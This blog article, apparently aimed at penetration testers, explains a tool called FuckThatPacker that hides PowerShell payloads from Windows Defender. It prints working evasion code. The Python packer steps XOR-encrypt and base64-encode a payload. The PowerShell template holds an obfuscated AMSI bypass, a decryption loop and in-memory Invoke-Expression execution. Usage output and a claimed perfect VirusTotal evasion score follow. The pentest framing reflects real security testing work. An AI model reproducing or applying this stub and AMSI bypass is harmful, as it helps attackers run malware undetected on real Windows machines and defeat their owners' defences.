> We already have discussed several times the notion of discretion or even anti-virus evasion. It is of course an essential component of the Ethical hacking area. Today, we will see how \[FuckThatPacker\]([https://github.com/Unknow101/FuckThatPacker](https://github.com/Unknow101/FuckThatPacker)" works, a tool recently developed by [@inf0sec](https://twitter.com/inf0sec1) to answer a simple problem which is "How to pass any PowerShell script through Windows Defender".

* * *

## How It Works?

After several types of research, it turns out that even by offending each of the lines of the Cobalt Strike base Resource Kit we are left with detected malware. The problem stems from the base64 shellcode which is analyzed by AMSI (Anti-Malware Scan Interface) which is mostly detected as a malicious script. **FuckThatPacker** therefore, assumes that if the malware is completely encrypted via an XOR and integrated into a "stub" allowing decryption in a memory coupled with a simple AMSI bypass then this will suffice to override antivirus.

Here is the detail of the code. The script will retrieve the contents of the load:

```html
with open(args.payload) as f:
    content = f.read()
```

The code will first be encoded using UTF16-LittleEndian since it is the encoding taken by Windows:

```html
print "[+] Encode UTF16-LE"
content = content.encode("utf-16")
```

Then be encrypted via a simple XOR with the digital key chosen by the user:

```html
print "[+] Cyphering Payload ..."
content = xor_payload(content,key)
```

Everything will finally be encoded in base64 to have only printable characters, before being integrated into the template supplied with the project:

```html
print "[+] Base64 Payload"
content = base64.b64encode(content)

print "[+] Writting into Template"
with open("template.txt") as f:
    template = f.read()

template = template.replace("%%DATA%%",content)
template = template.replace("%%KEY%%",str(key))
```

The idea behind using a template is to make the project malleable by the community. In this way, anyone can modify their template to have an offended load of their own. Besides, this makes it possible to avoid possible future signatures. Now let's take a quick look at the template:

```html
[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType(("{5}{2}{0}{1}{3}{6}{4}" -f 'ut',('oma'+'t'+'ion.'),'.A',('Ams'+'iUt'),'ls',('S'+'ystem.'+'Manage'+'men'+'t'),'i')).GetField(("{1}{2}{0}" -f ('Co'+'n'+'text'),('am'+'s'),'i'),[Reflection.BindingFlags]("{4}{2}{3}{0}{1}" -f('b'+'lic,Sta'+'ti'),'c','P','u',('N'+'on'))).GetValue($null),0x41414141)
$a = "%%DATA%%"
$b = [System.Convert]::FromBase64String($a)
for($x = 0; $x -lt $b.Count; $x++)
{
    $b[$x] = $b[$x] -bxor %%KEY%%
}
IEX ([System.Text.Encoding]::Unicode.GetString($b))
```

The first line of code is for the AMSI bypass. This line eliminates this feature and prevents Defender from decoding the encoded parts to try to find signatures. The variable "$a" will be assigned the encrypted part of our load, it will then be decoded in the variable "$b" then passed in a loop allowing us to decrypt the bytes of the load one by one. The `IEX` command (for Invoke-Expression) will simply allow the load to be executed in memory.

The help menu is pretty self-explanatory but here is a demonstration of how to use the tool:

```html
python FuckThatPacker.py -k 32 -p /root/payload.ps1 -o obfuscated.ps1

  ___        _   _____ _         _   ___         _
 | __|  _ __| |_|_   _| |_  __ _| |_| _ \__ _ __| |_____ _ _
 | _| || / _| / / | | | ' \/ _` |  _|  _/ _` / _| / / -_) '_|
 |_| \_,_\__|_\_\ |_| |_||_\__,_|\__|_| \__,_\__|_\_\___|_|


Written with <3 by Unknow101/inf0sec
v1.0[+] Encode UTF16-LE
[+] Cyphering Payload ...
[+] Base64 Payload
[+] Writting into Template
[+] Writting into obfuscated.ps1
```

As indicated on the last line, the encrypted payload is found in the "obfuscated.ps1" file if no output file is provided, the script will display it in stdout.

```html
cat obfuscated.ps1
[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType(("{5}{2}{0}{1}{3}{6}{4}" -f 'ut',('oma'+'t'+'ion.'),'.A',('Ams'+'iUt'),'ls',('S'+'ystem.'+'Manage'+'men'+'t'),'i')).GetField(("{1}{2}{0}" -f ('Co'+'n'+'text'),('am'+'s'),'i'),[Reflection.BindingFlags]("{4}{2}{3}{0}{1}" -f('b'+'lic,Sta'+'ti'),'c','P','u',('N'+'on'))).GetValue($null),0x41414141)
$a = "395zIE[...]ICog"
$b = [System.Convert]::FromBase64String($a)
for($x = 0; $x -lt $b.Count; $x++)
{
    $b[$x] = $b[$x] -bxor 32
}
IEX ([System.Text.Encoding]::Unicode.GetString($b))
```

* * *

## The Verdict

Having no personal [Virus Total](https://www.virustotal.com/) on hand, we had to use the original which unfortunately shares the samples with the suppliers. Despite everything, this makes it possible to put a numerical score and to judge the effectiveness of the tool since we obtain a perfect score.

* * *

## Conclusion

This article was far from technical and the tool rather simplistic. On the other hand, it responds in a very simple way to the problem posed. We hesitated to offer you this article because of its lack of technical level but we hope it can help some of you who have problems with antivirus evasion during pentest, lab, challenges, etc ...